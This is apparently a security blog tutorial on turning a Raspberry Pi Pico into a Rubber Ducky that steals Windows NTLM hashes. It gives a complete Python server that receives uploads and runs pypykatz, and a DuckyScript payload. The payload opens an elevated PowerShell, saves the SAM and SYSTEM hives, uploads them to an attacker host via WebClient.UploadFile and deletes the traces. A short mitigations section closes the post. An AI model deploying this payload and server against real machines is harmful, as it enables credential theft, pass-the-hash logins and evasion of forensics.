---
title: "Registry Hive Dumping and NTLM Hash Exfiltration via Pico USB HID"
date: 02-27-2026
excerpt: NTLM Hash Dumping
cover: ../uploads/cover_ntlm.jpg
tags: NTLM dumping, Rubber Ducky Pico
---

Good day, everyone! It feels great to be back writing and polishing a new writeup on Medium after some time away. If you've been following my CTF journey, a quick update: I've moved my detailed CTF writeups over to [GitBook](https://kur0sh1r0.gitbook.io/ctf-writeups), where everything is now better organized and easier to follow. Feel free to check it out on my profile if you're interested in deep dives, walkthroughs, and lessons learned from various challenges.

Now, let's get straight to our agenda: **how can a Raspberry Pi Pico, acting as a Rubber Ducky, be used to dump NTLM hashes?** We'll break down the idea behind the attack, how USB HID trust is abused, and why physical access alone can be enough to compromise a system.

![Raspberry Pi Pico](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N8D7Te4GlW_lsFcPsgCBjg.png)

At its core, this attack abuses the implicit trust operating systems place in **USB Human Interface Devices (HID)** such as keyboards. When a Raspberry Pi Pico is programmed to emulate a keyboard, the target system does not distinguish it from a legitimate input device. The moment it is plugged in, the OS accepts keystrokes without question — no drivers, no warnings, no user interaction required. This allows the Pico, acting as a Rubber Ducky, to automatically inject a pre-scripted sequence of commands at machine speed, effectively executing actions as if a real user were typing them.

By leveraging this trust, the injected commands can trigger built-in Windows utilities or PowerShell scripts that extract NTLM credential material from memory or the local system. Since NTLM hashes are often cached for authentication purposes, an attacker with brief physical access can dump these hashes without exploiting a traditional software vulnerability. In many cases, this technique bypasses antivirus detection because it relies on legitimate tools already present on the system, making it a classic example of a **living-off-the-land** attack where hardware-assisted input becomes the attack vector.

## Understanding NTLM Authentication in Windows

NTLM (NT LAN Manager) is a challenge–response authentication protocol used by Windows systems to authenticate users without transmitting their plaintext passwords over the network. Instead of sending the actual password, Windows derives an **NTLM hash** from the user's password and uses that hash during the authentication process. While newer environments rely heavily on Kerberos, NTLM is still widely supported for backward compatibility, local authentication, and specific network scenarios.

When a user attempts to authenticate, the system generates a challenge that must be answered using the user's NTLM hash. If the response matches what the system expects, access is granted. The critical issue here is that **possession of the hash is often enough to authenticate**, even without knowing the original password. This is what enables attacks such as *pass-the-hash*, where an attacker can reuse a captured NTLM hash to authenticate as a victim user without ever cracking the password.

Because NTLM hashes remain valid until the password is changed, dumping them can have long-lasting impact. In enterprise environments, a single compromised hash — especially from a privileged account — can lead to lateral movement, privilege escalation, and full domain compromise. This makes NTLM hashes a high-value target during post-exploitation and physical access attacks.

## Where NTLM Hashes Are Stored

Windows does not store NTLM hashes in a single location; instead, they exist across multiple components depending on how and when authentication occurs. Understanding where these hashes live is essential to understanding how attackers extract them.

For **local user accounts**, NTLM hashes are stored in the **Security Account Manager (SAM)** database. The SAM itself is protected and cannot be read directly while the system is running. To decrypt the hashes inside it, Windows relies on the **SYSTEM registry hive**, which contains the boot key used to encrypt the SAM. Accessing both the SAM and SYSTEM hives with administrative privileges allows an attacker to recover local account NTLM hashes offline or via live dumping techniques.

For **logged-in users**, NTLM hashes may also reside in memory inside the **Local Security Authority Subsystem Service (LSASS)** process. LSASS is responsible for handling authentication and credential management, and it temporarily stores credential material — including NTLM hashes — for active sessions. Dumping LSASS memory is one of the most common ways attackers retrieve credentials during post-exploitation because it often contains hashes for multiple users, including administrators.

Additionally, Windows may store **cached domain credentials** in the **SECURITY** registry hive when systems authenticate against a domain. These cached credentials allow users to log in even when a domain controller is unavailable. While not always present, they represent another potential source of NTLM hashes when accessed with sufficient privileges.

In short, NTLM hashes exist both **at rest** (in registry hives like SAM and SECURITY) and **in memory** (within LSASS). This distributed storage model is exactly what makes credential dumping attacks effective — and why automating the extraction process using a trusted input device like a USB HID can be so dangerous.

While manually dumping NTLM hashes is effective, it comes with a major limitation: **time**. Techniques involving tools like Mimikatz or offline hive extraction typically require sustained access to the target machine. An attacker needs enough time to elevate privileges, transfer tools, execute commands carefully, and ensure the extracted data is successfully retrieved. In real-world scenarios — especially in shared offices, labs, or public environments — this level of uninterrupted access is rarely guaranteed.

Now imagine a different situation: access to the victim's computer lasts only a few seconds. Maybe the user steps away briefly, or the machine is unattended just long enough for a USB device to be inserted. In such cases, manual techniques become impractical. There is no time to deploy tools, troubleshoot errors, or interact with the system directly. **This is where our agenda comes in.** By leveraging a Raspberry Pi Pico acting as a Rubber Ducky, the entire manual process can be compressed into an automated sequence of trusted keystrokes — executed instantly, silently, and without raising suspicion. What normally takes minutes can now be achieved in moments, turning a brief glimpse of physical access into a full credential compromise.

## Automating the Attack with Raspberry Pi Pico (Rubber Ducky)

Before the Raspberry Pi Pico can function as a Rubber Ducky, it must be properly configured. The complete step-by-step setup process is documented in the [GitHub](https://github.com/dbisu/pico-ducky) repository referenced below.

With the preparation out of the way, we can now proceed to the core of the attack. The first step is creating our server.

We'll implement the server using Python, and the following modules are required:

```
rich
pypykatz
```

For the **pypykatz**, you can install it via **apt**:

```
sudo apt install python3-pypykatz
```

The full server source code is provided below. Inline comments explain each part of the implementation in detail:

```python
import http.server
import socketserver
import os
import subprocess
import logging
from rich.console import Console
from rich.text import Text
from datetime import datetime
# =========================
# Server Configuration
# =========================
# IP address to bind the HTTP server to
# 0.0.0.0 allows connections from any network interface
IP = "0.0.0.0"
# Port used by the server to receive uploaded files
PORT = 1234
# Directory where uploaded registry hives will be stored
UPLOAD_DIR = "uploads"
# =========================
# Console & Logging Setup
# =========================
# Initialize Rich console for colored and formatted output
console = Console()
# Suppress default HTTP server logs to keep output clean
# This prevents noisy access logs from cluttering the terminal
logging.getLogger('http.server').setLevel(logging.CRITICAL)
# Ensure the upload directory exists before starting the server
if not os.path.exists(UPLOAD_DIR):
    os.makedirs(UPLOAD_DIR)
# =========================
# Global State Tracking
# =========================
# Track how many files have been received
# We expect exactly two files: sam.dump and system.dump
file_count = 0
# Store paths of received files for later processing
received_files = []
# =========================
# Credential Extraction Logic
# =========================
def dump_credentials(sam_path, system_path):
    """
    Use pypykatz to extract NTLM hashes from dumped
    SAM and SYSTEM registry hives.
    This is performed offline, avoiding interaction
    with LSASS and reducing detection risk.
    """
    console.print(
        Text(
            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
            "Starting credential extraction using pypykatz...",
            style="bold cyan"
        )
    )
    try:
        # Change working directory to UPLOAD_DIR
        # This allows us to reference hive files using relative paths
        os.chdir(UPLOAD_DIR)
        # Construct the pypykatz command for offline registry parsing
        cmd = ["pypykatz", "registry", "--sam", "sam.dump", "system.dump"]
        console.print(
            Text(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                f"Executing command: {' '.join(cmd)}",
                style="bold magenta"
            )
        )
        # Execute pypykatz and capture its output
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
        # Display extracted credentials in the console
        console.print(
            Text(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                "Extracted Credentials:",
                style="bold green"
            )
        )
        console.print(Text(result.stdout, style="yellow"))
    except Exception:
        # Suppress all exceptions to prevent server crashes
        # This keeps the server running even if extraction fails
        pass
# =========================
# HTTP Upload Handler
# =========================
class UploadHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP handler that accepts POST requests
    and processes uploaded SAM and SYSTEM registry hives.
    """
    def do_POST(self):
        global file_count, received_files
        # Read request body length
        content_length = int(self.headers['Content-Length'])
        # Extract multipart boundary from Content-Type header
        boundary = self.headers['Content-Type'].split("=")[1].encode()
        # Read raw POST request body
        body = self.rfile.read(content_length)
        # =========================
        # Extract Filename
        # =========================
        # Locate filename inside multipart form data
        filename_start = body.find(b'filename="') + len(b'filename="')
        filename_end = body.find(b'"', filename_start)
        filename = body[filename_start:filename_end].decode()
        # Only accept SAM and SYSTEM dumps
        # This prevents arbitrary file uploads
        if filename not in ["sam.dump", "system.dump"]:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid filename")
            return
        # =========================
        # Extract File Contents
        # =========================
        # Locate start and end of the actual file data
        content_start = body.find(b'\r\n\r\n') + 4
        content_end = body.rfind(b'--' + boundary)
        file_content = body[content_start:content_end]
        # Save the uploaded file to disk
        filepath = os.path.join(UPLOAD_DIR, filename)
        with open(filepath, 'wb') as f:
            f.write(file_content)
        # =========================
        # Logging & Tracking
        # =========================
        file_count += 1
        received_files.append(filepath)
        console.print(
            Text(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                f"Received file {file_count}/2: {filename} "
                f"(Saved to: {filepath}, Size: {len(file_content)} bytes)",
                style="bold green"
            )
        )
        # Send HTTP success response
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"File uploaded successfully")
        # =========================
        # Trigger Credential Dump
        # =========================
        # Once both SAM and SYSTEM hives are received,
        # automatically process them with pypykatz
        if file_count == 2:
            console.print(
                Text(
                    f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                    "Both registry hives received. Starting analysis...",
                    style="bold cyan"
                )
            )
            dump_credentials(
                sam_path=[f for f in received_files if "sam.dump" in f][0],
                system_path=[f for f in received_files if "system.dump" in f][0]
            )
            # Reset state to allow future uploads
            file_count = 0
            received_files = []
    def log_message(self, format, *args):
        """
        Override default logging behavior to suppress
        standard HTTP access logs.
        """
        pass
# =========================
# Server Startup
# =========================
# Create and start the TCP server
with socketserver.TCPServer((IP, PORT), UploadHandler) as server:
    console.print(
        Text(
            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
            f"Server listening on {IP}:{PORT}",
            style="bold blue"
        )
    )
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        console.print(
            Text(
                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] "
                "Shutting down server...",
                style="bold red"
            )
        )
        server.server_close()
```

At this point, we'll begin developing the Raspberry Pi Pico payload:

```
REM --------------------------------------------------
REM Initial delay to allow the OS to fully recognize
REM the Raspberry Pi Pico as a trusted USB keyboard
REM --------------------------------------------------
DELAY 1000
REM --------------------------------------------------
REM Open the Windows Power User menu (Win + X)
REM --------------------------------------------------
GUI x
DELAY 1000
REM --------------------------------------------------
REM Select "Windows Terminal / PowerShell (Admin)"
REM The 'a' key corresponds to the admin option
REM --------------------------------------------------
STRING a
DELAY 1000
REM --------------------------------------------------
REM Handle UAC prompt by moving selection to "Yes"
REM and confirming elevated execution
REM --------------------------------------------------
LEFT
DELAY 1000
ENTER
DELAY 3000
REM ==================================================
REM STEP 1: Move to a writable and less suspicious
REM location (TEMP directory)
REM This avoids permission issues and reduces noise
REM ==================================================
STRING cd $env:TEMP
ENTER
DELAY 1000
REM ==================================================
REM STEP 2: Dump Windows registry hives
REM SAM  -> contains local account NTLM hashes
REM SYSTEM -> contains the boot key required to
REM decrypt the SAM database
REM ==================================================
STRING reg save hklm\sam "$env:TEMP\sam.dump"
ENTER
DELAY 1000
STRING reg save hklm\system "$env:TEMP\system.dump"
ENTER
DELAY 1000
REM ==================================================
REM STEP 3: Exfiltrate dumped hives to attacker server
REM Uses PowerShell's native WebClient class
REM No external tools are dropped on the system
REM ==================================================
STRING $wc = New-Object System.Net.WebClient
ENTER
DELAY 1000
STRING $wc.UploadFile("http://<ATTACKER_IP>:<ATTACKER_PORT>/upload", "$env:TEMP\sam.dump")
ENTER
DELAY 1000
STRING $wc.UploadFile("http://<ATTACKER_IP>:<ATTACKER_PORT>/upload", "$env:TEMP\system.dump")
ENTER
DELAY 1000
REM ==================================================
REM STEP 4: Clean up artifacts from disk
REM Removes dumped registry hives to minimize
REM forensic footprint on the victim machine
REM ==================================================
STRING Remove-Item "$env:TEMP\sam.dump","$env:TEMP\system.dump"
ENTER
DELAY 1000
REM --------------------------------------------------
REM Exit the elevated PowerShell session gracefully
REM --------------------------------------------------
STRING exit
ENTER
```

The payload is saved as `payload.dd` because of how **Rubber Ducky–style firmware interprets scripts**, not because of the content itself.

**The short, real reason**

When you flash **DuckyScript-compatible firmware** (like Pico Duck, Pico-Ducky, or similar) onto the Raspberry Pi Pico, the firmware is **hardcoded to look for a file named** `payload.dd` on the device's storage.
If that file doesn't exist—or is named differently—the payload simply **won't execute**.

**What `.dd` actually means**

- `.dd` stands for **DuckyScript**
- It's not a real programming language extension in the traditional sense
- It's a **convention enforced by the firmware**, not by the OS.

The firmware does something conceptually like this on boot:

```
If file == payload.dd:
    parse as DuckyScript
    execute keystrokes
```

So the filename is part of the execution logic.

Returning to the main objective, with the attack prepared, we can now move on to execution. A **Windows VM** serves as the victim, and **Kali Linux** functions as the attacker machine in this setup.

We begin by configuring the attacker environment. Make sure all previously mentioned dependencies are installed on the attacker machine, then launch the server.

![captionless image](https://miro.medium.com/v2/resize:fit:1248/format:webp/1*eF6SA2f8TIBE38fj8RhQ_A.png)

With the server now up and running, it's time to connect our DIY USB Rubber Ducky and let it do its thing — extracting and dumping those hashes.

The following steps outline what happens when the USB device is plugged into the PC:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lsZ-TQPPT3fIT08V__ZIbQ.gif)

In just a matter of seconds, we managed to pull the hashes successfully, proof of the Rubber Ducky's raw power.

![Now that I have the NT hash, I can use it to login as Lebron using Evil-WinRM](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N-GQsUFTdD9sdi44ohWlKQ.png)

To better understand how the server operates and how it interacts with the Raspberry Pi Pico payload, the entire process can be broken down into a simple, linear flow. The goal of the server is to **receive dumped registry hives, process them automatically, and extract NTLM hashes without manual intervention.**

```
┌──────────────────────┐
│ Raspberry Pi Pico    │
│ (USB HID RubberDuck) │
└─────────┬────────────┘
          │
          │ 1. Injects keystrokes via USB HID
          │    - Dumps SAM & SYSTEM hives
          │    - Uploads files using PowerShell WebClient
          ▼
┌──────────────────────┐
│ Victim Windows Host  │
│                      │
│ reg save HKLM\SAM    │
│ reg save HKLM\SYSTEM │
│                      │
│ $wc.UploadFile(...)  │
└─────────┬────────────┘
          │
          │ 2. HTTP POST request (multipart/form-data)
          │    - sam.dump
          │    - system.dump
          ▼
┌──────────────────────────────────┐
│ Python HTTP Server               │
│ (UploadHandler)                  │
│                                  │
│ - Validates filenames            │
│ - Writes files to /uploads       │
│ - Tracks upload state            │
└─────────┬────────────────────────┘
          │
          │ 3. Both files received
          │    (file_count == 2)
          ▼
┌──────────────────────────────────┐
│ dump_credentials()               │
│                                  │
│ pypykatz registry --sam --system │
│                                  │
│ Offline NTLM hash extraction     │
└─────────┬────────────────────────┘
          │
          │ 4. Credentials printed
          │    to console (Rich)
          ▼
┌──────────────────────┐
│ Attacker Console     │
│ NTLM Hashes          │
│ Usernames            │
│ Cached Credentials   │
└──────────────────────┘
```

## Mitigations and Defensive Measures

Now that you see how fast and dangerous it is, what are the ways to avoid it? Simple — **never trust USBs**. Treat every unknown or unattended USB device as potentially malicious, no matter how harmless it looks.

First, **disable automatic execution and HID trust** where possible. Many attacks succeed because the operating system immediately accepts a USB device as a keyboard without user interaction. Restricting or prompting for new HID devices adds a critical layer of defense.

Second, **use endpoint protection and device control policies**. Modern security solutions can block unauthorized USB devices, restrict HID emulation, or allow only whitelisted hardware. This drastically reduces the attack surface.

Third, **limit user privileges**. Payloads become far less effective when users operate under standard accounts instead of administrative ones. Least-privilege policies can prevent credential dumping and system-level changes.

Fourth, **monitor unusual behavior**. Rapid command execution, sudden PowerShell activity, or outbound connections triggered immediately after a USB insertion should raise red flags. Proper logging and alerting can turn seconds into saved systems.

Lastly, **user awareness matters**. Technical defenses help, but human curiosity is still the weakest link. Training users to avoid plugging in unknown USB devices — especially those found in public or shared spaces — can stop the attack before it even begins.

In short: if you didn't buy it, request it, or verify it — **don't plug it in**. One careless USB insertion is all it takes.

That's a wrap for today! I hope you picked up something new and useful from this writeup. Stay curious, stay safe, and always take care in the digital world — your attention is your best defense.
